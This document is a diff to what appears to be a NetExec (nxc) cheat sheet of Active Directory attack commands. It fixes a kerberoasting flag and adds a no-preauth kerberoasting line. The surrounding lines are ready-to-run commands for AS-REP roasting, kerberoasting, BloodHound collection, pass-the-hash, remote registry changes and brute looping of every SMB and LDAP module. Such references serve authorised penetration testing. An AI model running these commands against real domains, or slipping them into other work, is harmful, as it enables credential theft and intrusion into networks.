@@ -5,7 +5,7 @@ nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --bloodhound -c all --dns-server "$IP"
 nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M tombstone -o ACTION=query -k
 nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M tombstone -k -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db
 nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --asreproast ASREProstables.txt
-nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoast Kerberoastables.txt
+nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt
 nxc ldap "$IP" -u "$USER" -H "$NT_HASH" -k --dns-server $IP
 nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-krb5 /etc/krb5.conf
 nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-hosts /etc/hosts
@@ -73,3 +73,4 @@ nxc smb "$IP" -u "$USER" -H "$NT_HASH" --local-auth -x 'reg add HKLM\System\Curr
 proxychains nxc smb "$IP"
 for MODULE in $(cat smb.txt); do  nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M $MODULE ; done
 for MODULE in $(cat ldap.txt); do  nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M $MODULE ; done
+nxc ldap "$IP" -u "$USER" -p "" --no-preauth-targets users.txt --kerberoasting Kerberoastables.txt
